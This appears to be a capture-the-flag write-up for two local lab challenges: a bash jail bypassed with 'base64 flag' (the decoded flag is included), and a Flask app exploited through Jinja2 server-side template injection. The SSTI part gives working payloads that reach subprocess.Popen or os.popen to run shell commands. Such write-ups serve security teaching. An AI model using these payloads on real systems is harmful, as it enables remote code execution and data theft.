# Bash Jail Challenges

## Fiberglass

### 1. Start Docker Container

```bash
docker compose up --build -d
```

### 2. Open Firefox and navigate to:

```
http://127.0.0.1
```

### 3. Understanding the Regular Expressions

```php
preg_replace('/[^a-z]/', '', $input);
```

* `[^a-z]`: Matches any character that is **not** a lowercase letter a–z.
* Replaces all non-lowercase-letter characters with an empty string.

```php
preg_match('/^[fiberglass]*$/', $lettersOnly);
```

* `^`: Start of the string
* `[fiberglass]*`: Zero or more characters from the set `f, i, b, e, r, g, l, a, s`
* `$`: End of the string
* Checks whether the entire string contains only letters from the word **“fiberglass”**.

```php
preg_replace('/\s+/', ' ', $command);
```

* `\s`: Matches any whitespace character
* `+`: One or more repetitions
* Replaces multiple consecutive whitespace characters with a single space.

### 4. Solution

The goal is to find a shell command that outputs the content of the file `flag` to stdout.

* The command can only contain letters from the set `[fiberglass]`.
  * The function `isValidInput()` filters out all characters not in this set.
  * Other characters (e.g., numbers) are ignored during validation.
* The command must not be on the `blacklist`.

Use the [Linux man pages](https://man7.org/linux/man-pages/index.html) to:
* Search for commands or programs that output to `standard output`.
* Look for utilities that match the allowed character set

```
base64 flag
```

```bash
echo "Q1RGe3JhY2VfY29uZGl0aW9uX3N5bWxpbmt9Cg==" | base64 -d
```

---

# Python Jail Challenges

## Useful Links

* [Python Built-in Functions](https://docs.python.org/3/library/functions.html)
* [KitCTF – Python Jails](https://kitctf.de/learning/python-jails)
* [Escaping Python Jails – Blog by anee.me](https://anee.me/escaping-python-jails-849c65cf306e)
* [Python Jail Cheatsheet– shirajuki](https://shirajuki.js.org/blog/pyjail-cheatsheet)
* [Cobalt SSTI Overview](https://www.cobalt.io/vulnerability-wiki/v5-validation-sanitization/ssti)
* [Flask Jinja2 SSTI Cheatsheet – P=NP Team](https://pequalsnp-team.github.io/cheatsheet/flask-jinja2-ssti)

## portal

### 1. Start Webserver

```bash
python3 -m venv venv              # Create virtual environment
source venv/bin/activate          # Activate venv
pip install -r requirements.txt   # Install dependencies
python3 app.py                    # Start Flask app
# deactivate                      # Deactivate venv
```

### 2. Open Firefox and navigate to:

```
http://127.0.0.1:5000
```

### 3. Potential Vulnerabilities in `app.py`

* The `username` is rendered unescaped directly into the HTML template:

  ```python
  name = request.form['user']
  template = ''' ... %s ... ''' % name
  return render_template_string(template)
  ```

* Only the `Username` field is rendered into the page, the `Password` field is irrelevant.

### 4. Vulnerability Testing

#### Cross-Site Scripting (XSS)

Example:

```html
<script>alert('XSS')</script>
```

* ❌ Not exploitable here, since `name` is rendered inside an HTML comment (`<!-- ... -->`).

#### Server-Side Template Injection (SSTI)

* Flask uses Jinja2 as its templating engine.
* Test with `{{ 7*6 }}` if `42` appears, Jinja2 is executing the input.
* Page source shows `42`, confirming SSTI.

### 5. Exploitation

Use Python object inheritance and the Jinja2 rendering engine to access built-in classes like `subprocess.Popen` to execute system commands.

* `{{ ''.__class__ | safe }}` returns the class of an empty string: `<class 'str'>`
* `{{ ''.__class__.__mro__ | safe }}` returns the Method Resolution Order (MRO), which defines the inheritance hierarchy: `(<class 'str'>, <class 'object'>)`
* `{{ ''.__class__.__mro__[1] | safe }}` accesses `<class 'object'>`, the root of all Python classes.
* `{{ ''.__class__.__mro__[1].__subclasses__() | safe }}` returns a list of all subclasses of `object`, including.

Loop over all subclasses to find the index of `subprocess.Popen`

```
{% for cls in ''.__class__.__mro__[1].__subclasses__() %}
  {% if 'Popen' in cls.__name__ %}
    {{ loop.index0 }} - {{ cls | safe }}
  {% endif %}
{% endfor %}
```

Once you identify the index here (`405 - <class 'subprocess.Popen'>`), use the following payload:

`{{ ''.__class__.__mro__[1].__subclasses__()[405]('cat flag.txt', shell=True, stdout=-1).communicate()[0].decode() | safe }}`

* `subprocess.Popen(...)` runs a shell command
* `shell=True` enables shell features
* `stdout=-1` captures standard output
* `.communicate()` returns a tuple `(stdout, stderr)`
* `[0].decode()` extracts and decodes stdout to a string

Note:

> Flask with Jinja2 uses HTML escaping by default to prevent XSS.
> Characters like `'`, `<`, and `>` are escaped to `&#39;`, `&lt;`, and `&gt;`.
> Using the `|safe` filter disables escaping and renders raw output.

---

### Alternative SSTI Payload

You can also use the `os` module from Flask’s config object:

`{{ config.__class__.__init__.__globals__['os'].popen('cat flag.txt').read() }}`

* `config.__class__` accesses the class of the `config` object.
* `__init__.__globals__` gives access to the global namespace of the constructor.
* `['os']` accesses the `os` module.
* `.popen('cat flag.txt').read()` executes the shell command and reads the output.

---
